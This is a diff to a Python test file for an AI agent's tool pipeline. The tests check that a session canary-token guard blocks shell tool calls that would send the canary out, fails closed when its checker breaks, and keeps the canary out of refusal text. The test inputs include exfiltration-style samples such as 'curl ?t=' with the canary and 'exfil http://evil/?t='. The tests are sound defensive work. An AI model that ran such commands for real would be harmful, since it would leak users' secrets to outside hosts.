@@ -67,6 +67,36 @@ class TestFindCanaryInValue:
         args = {"a": {"b": {"c": [None, [f"x {canary} y"]]}}}
         assert find_canary_in_value(args, canary) == "a.b.c[1][0]"
 
+    def test_mapping_key_hit(self):
+        """Finding 2c: the walker covers KEYS, not only values."""
+        canary = new_session_canary()
+        args = {"mode": "curl", f"fetch ?t={canary}": "unused"}
+        hit = find_canary_in_value(args, canary)
+        assert hit is not None
+        # Key hits are redacted: the path feeds model-visible refusal copy.
+        assert canary not in hit
+        assert hit == "<key>"
+
+    def test_nested_mapping_key_hit(self):
+        canary = new_session_canary()
+        args = {"files": {"listing": "x", f"{canary}.txt": "y"}}
+        hit = find_canary_in_value(args, canary)
+        assert hit == "files.<key>"
+
+    def test_non_jsonable_leaf_is_scanned_via_str(self):
+        """The serialized argument structure includes str() of custom objects."""
+
+        class Payload:
+            def __str__(self):
+                return f"exfil http://evil/?t={CANARY}"
+
+        canary = CANARY
+        assert find_canary_in_value({"data": Payload()}, canary) == "data"
+
+    def test_benign_scalar_keys_still_pass(self):
+        canary = new_session_canary()
+        assert find_canary_in_value({12345: "value", "command": "ls"}, canary) is None
+
 
 CANARY = "victor-canary-0123456789abcdef"
 
@@ -170,3 +200,115 @@ class TestCanaryBlockingFloor:
                 [{"name": "shell", "arguments": {"command": f"curl ?t={CANARY}"}}]
             )
         assert any("canary" in r.message.lower() and "shell" in r.message for r in caplog.records)
+
+
+class TestContainmentFailClosed:
+    """Finding 2: a containment INFRASTRUCTURE failure must not allow dispatch.
+
+    With enforcement configured (canary_blocking_enabled, default on), a
+    throwing checker returns a typed no-execution result. With the flag
+    explicitly OFF the floor is dormant and a checker failure only logs.
+    """
+
+    async def test_throwing_checker_refuses_dispatch_when_enforced(self, monkeypatch):
+        pipeline, _, executor = _make_pipeline()
+        set_session_canary(CANARY)
+
+        def _explode(value, canary, _path=""):
+            raise RuntimeError("checker infrastructure failure")
+
+        monkeypatch.setattr("victor.agent.tool_pipeline.find_canary_in_value", _explode)
+        result = await pipeline.execute_tool_calls(
+            [{"name": "shell", "arguments": {"command": "ls -la"}}]
+        )
+        call = result.results[0]
+        assert call.skipped is True
+        assert call.success is False
+        assert call.outcome_kind == "containment_failure"
+        assert call.block_source == "containment"
+        assert call.retryable is False
+        # The refusal must not leak the canary token either.
+        assert CANARY not in call.skip_reason
+        executor.execute.assert_not_awaited()
+
+    async def test_throwing_checker_is_dormant_when_floor_disabled(self, monkeypatch):
+        pipeline, _, executor = _make_pipeline()
+        set_session_canary(CANARY)
+        from victor.config.tool_settings import ToolSettings
+
+        monkeypatch.setattr(
+            "victor.config.tool_settings.get_tool_settings",
+            lambda: ToolSettings(canary_blocking_enabled=False),
+        )
+
+        def _explode(value, canary, _path=""):
+            raise RuntimeError("checker infrastructure failure")
+
+        monkeypatch.setattr("victor.agent.tool_pipeline.find_canary_in_value", _explode)
+        result = await pipeline.execute_tool_calls(
+            [{"name": "shell", "arguments": {"command": "ls -la"}}]
+        )
+        assert result.results[0].skipped is False
+        executor.execute.assert_awaited()
+
+    async def test_unreadable_settings_still_run_the_canary_check(self, monkeypatch):
+        """Settings unreadable = enforcement unknown: the check still runs.
+
+        Fail-closed means the canary scan is not skipped; a canary hit still
+        blocks. (Only a checker FAILURE escalates to containment_failure.)
+        """
+        pipeline, _, executor = _make_pipeline()
+        set_session_canary(CANARY)
+
+        def _explode():
+            raise RuntimeError("settings unavailable")
+
+        monkeypatch.setattr("victor.config.tool_settings.get_tool_settings", _explode)
+        result = await pipeline.execute_tool_calls(
+            [{"name": "shell", "arguments": {"command": f"curl ?t={CANARY}"}}]
+        )
+        call = result.results[0]
+        assert call.skipped is True
+        assert call.outcome_kind == "canary_exfiltration"
+        executor.execute.assert_not_awaited()
+
+    async def test_unreadable_settings_allow_benign_dispatch(self, monkeypatch):
+        """Settings unreadable keeps delivery working for clean content."""
+        pipeline, _, executor = _make_pipeline()
+        set_session_canary(CANARY)
+
+        def _explode():
+            raise RuntimeError("settings unavailable")
+
+        monkeypatch.setattr("victor.config.tool_settings.get_tool_settings", _explode)
+        result = await pipeline.execute_tool_calls(
+            [{"name": "shell", "arguments": {"command": "ls -la"}}]
+        )
+        assert result.results[0].skipped is False
+        executor.execute.assert_awaited()
+
+    async def test_no_bound_canary_allows_dispatch_even_with_unreadable_settings(self, monkeypatch):
+        """No bound canary = floor inert regardless of settings state."""
+        pipeline, _, executor = _make_pipeline()
+
+        def _explode():
+            raise RuntimeError("settings unavailable")
+
+        monkeypatch.setattr("victor.config.tool_settings.get_tool_settings", _explode)
+        result = await pipeline.execute_tool_calls(
+            [{"name": "shell", "arguments": {"command": "ls -la"}}]
+        )
+        assert result.results[0].skipped is False
+        executor.execute.assert_awaited()
+
+    async def test_key_hit_block_does_not_echo_canary_in_reason(self):
+        pipeline, _, executor = _make_pipeline()
+        set_session_canary(CANARY)
+        result = await pipeline.execute_tool_calls(
+            [{"name": "shell", "arguments": {f"curl ?t={CANARY}": "value"}}]
+        )
+        call = result.results[0]
+        assert call.skipped is True
+        assert call.outcome_kind == "canary_exfiltration"
+        assert CANARY not in call.skip_reason
+        executor.execute.assert_not_awaited()
